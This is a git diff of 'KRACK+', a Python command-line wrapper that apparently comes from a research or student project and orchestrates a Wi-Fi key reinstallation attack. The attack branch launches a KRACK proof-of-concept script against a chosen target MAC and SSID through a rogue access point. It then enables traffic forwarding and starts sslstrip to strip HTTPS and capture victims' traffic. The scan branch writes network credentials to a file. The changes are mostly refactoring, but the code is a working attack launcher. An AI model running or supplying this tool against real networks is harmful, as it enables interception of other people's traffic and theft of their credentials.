@@ -4,14 +4,18 @@ import optparse
 import subprocess
 import atexit
 import logging
-import thread
-import time
-from parser import *
+
+from parser import attackParser
+from parser import scanParser
+from parser import writeResults
+
 from multiprocessing import Process
-LOG_LEVEL = logging.DEBUG
-LOGFORMAT = "%(log_color)s%(message)s%(reset)s"
 from colorlog import ColoredFormatter
 from subprocess import check_output
+
+# For colored output
+LOGFORMAT = "%(log_color)s%(message)s%(reset)s"
+LOG_LEVEL = logging.DEBUG
 logging.root.setLevel(LOG_LEVEL)
 formatter = ColoredFormatter(LOGFORMAT)
 stream = logging.StreamHandler()
@@ -34,8 +38,9 @@ log.debug("KRACK+ 1.0 by Lars Magnus Trinborgholen, Fredrik Walloe and Lars Kris
 def main():
     timeOfLastConnectedDevice = 0
     help_text = "\nKRACK+ Scan: krackPlus [-s]\nKRACK+ Attack: krackPlus [-a] [--nic-mon NIC] [--nic-rogue-ap NIC] [--target-ssid SSID] [--target MAC-address]"
+    path = "~/krack/"
     parser = optparse.OptionParser(usage=help_text)
-    
+
 
     # KRACK+ Attack options
     parser.add_option('--attack', '-a', default=False, help="This option will run a key reinstallation attack against ....", dest='attack', action='store_true')
@@ -55,13 +60,13 @@ def main():
     parser.add_option('-d', help="This option will increase output verbosity for KRACK+ Scan", dest='debug', action='store_true')
     parser.add_option('--dd', help="This option will increase output verbosity even more for KRACK+ Scan (debugging purposes).", dest='dd', action='store_true')
 
-    #General KRACK+ options:
+    # General KRACK+ options:
     parser.add_option('--restore', '-r', help="This option will restore internet connection (wifi). Hopefully you'll never have to use this option.", dest='restore', default=False, action='store_true')
     
     options, args = parser.parse_args()
-    path = "~/krack/"
-    # Running scan scripts
-    if options.scan and not options.dd and not options.debug:
+    
+    ############# SCAN ################
+    if options.scan and not options.dd and not options.debug and not options.attack:
         #Write the credentials to file, so that they can be used next time the progran runs.
         with open('./networkCredentials.txt', 'w') as netCredentials:
             if len(options.password) >= 8:
@@ -113,35 +118,39 @@ def main():
             log.info("Restoring internet connection.")
             subprocess.call(["./restoreClientWifi.sh"])
                 
-    # Running attack scripts
+    ############# ATTACK ################
     elif options.attack and options.mon and options.rogue and options.target and options.targetSSID:
         try:
             print("Performing key reinstallation attack")
             #Sets up dependencies before the attack script runs
             subprocess.call(["./prepareClientAttack.sh"])
             with open('./attackOutput.txt', 'w') as attackOutput:
-                # Usually not necesary to cd to run a script, however Vanhoef implementation requires it, otherwise we would have to alter his code. 
+                # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code. 
                 subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./krack-all-zero-tk.py " + options.rogue + " " +
-                                 options.mon + " " + options.targetSSID + " " + options.target + " &"], stdout=attackOutput, shell=True)
-                # Usually not necesary to cd to run a script, however Vanhoef implementation requires it, otherwise we would have to alter his code. 
+                                 options.mon + " " + options.targetSSID + " --target " + options.target + " &"], stdout=attackOutput, shell=True)
+                # Usually not necesary to cd to run a script, however Vanhoef's implementation requires it, otherwise we would have to alter his code. 
                 subprocess.call(["cd krackattacks-poc-zerokey/krackattack/ && ./enable_internet_forwarding.sh &"])
                 subprocess.call(["sslstrip -w sslstrip.log &"])
-            	attackParser() 
+            	attackParser()
         except KeyboardInterrupt:
             log.info("Cleaning up and restoring wifi ...")
             subprocess.call(["./restoreClientWifi.sh"])
 	except:
             log.info("Error occurred. Restoring wifi ...")
             subprocess.call(["./restoreClientWifi.sh"])
-            
+    ############# RESTORE INTERNET ################        
     elif options.restore:
         log.debug("Restoring internet connection")
         subprocess.call(["./restoreClientWifi.sh"])
         log.info("Done, it'll take a few seconds for the client to connect to your Wi-Fi again, if 'auto-reconnect' is enabled on your device")
 
-    # Must specify an option    
+    elif options.attack and options.scan:
+        log.warn("Scan and attack cannot be run simultaneously. Please specify either [-a] or [-s].")
+        parser.print_help()
+        
+    ########## NO OPTION OR WRONG USAGE ###########    
     else:
-        log.warn("No option was given, please see usage below and try again!")
+        log.warn("No option was given or there were missing arguments, please see usage below and try again!")
         parser.print_help()
 
 if __name__ == '__main__':
